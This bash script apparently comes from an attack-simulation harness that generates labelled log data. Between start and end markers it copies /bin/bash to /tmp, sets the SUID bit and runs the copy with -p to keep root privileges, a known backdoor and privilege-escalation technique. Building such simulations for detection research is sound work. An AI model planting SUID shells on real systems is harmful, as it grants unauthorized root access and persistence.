#!/bin/bash
echo "Simulating OS-only Privilege Escalation (Category 1)..."
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh
casce_new_identity
echo "  identity=${CASCE_USER}@${CASCE_IP}"

/dataset_workspace/logger.sh mark_attack "attack_os_priv_escalation" start

# This attack happens entirely at the OS level, bypassing PostgreSQL, so
# there's no psql session to tag with casce.sim_user/sim_ip -- but the
# scratch binary name is still derived from the run's identity so
# concurrent/repeated runs never clobber each other's file.
SUID_BIN="/tmp/root_bash_${CASCE_USER}"
sh -c "cp /bin/bash ${SUID_BIN} && chmod +s ${SUID_BIN} && ${SUID_BIN} -p -c \"whoami\" > /dev/null 2>&1 || true"

/dataset_workspace/logger.sh mark_attack "attack_os_priv_escalation" end

echo "OS-only privilege escalation simulated."
